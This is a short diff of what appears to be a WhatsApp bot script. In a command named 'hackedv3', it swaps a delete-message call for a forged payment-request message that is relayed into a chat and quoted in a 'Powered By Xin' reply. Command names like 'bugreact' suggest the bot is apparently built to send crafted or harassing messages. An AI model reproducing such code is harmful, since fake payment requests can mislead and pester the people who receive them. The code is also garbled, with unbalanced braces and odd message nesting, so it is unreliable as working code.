@@ -587,16 +587,21 @@ xinn.sendMessage(from, { text: "awowkwkwk" }, { quoted: bugreact });
 }
 break
 case 'hackedv3':
-xinn.sendMessage(from, { delete: {
-  remoteJid: from,
-  fromMe: m.quoted.fromMe,
-  participant: '0@s.whatsapp.net'
-xinn.sendMessage(delete ? delete:from, {
+var requestPaymentMessage = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
+"requestPaymentMessage": {
+"currencyCodeIso4217": "USD",
+"amount1000": "100",
+"Message": {
+"TextMessage": {
+"text": `Powered By Xin`,
+}
+}}}), { userJid: m.chat, quoted: m })
+xinn.relayMessage(m.chat, requestPaymentMessage.message, { messageId: requestPaymentMessage.key.id })
+xinn.sendMessage(q ? q:from, {
                         text: 'Powered By Xin'
                     }, {
-                        quoted: nomore2
+                        quoted: requestPaymentMessage
                     })
-}})
 break
 case 'linkgroupoffc':
  var requestPaymentMessage = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
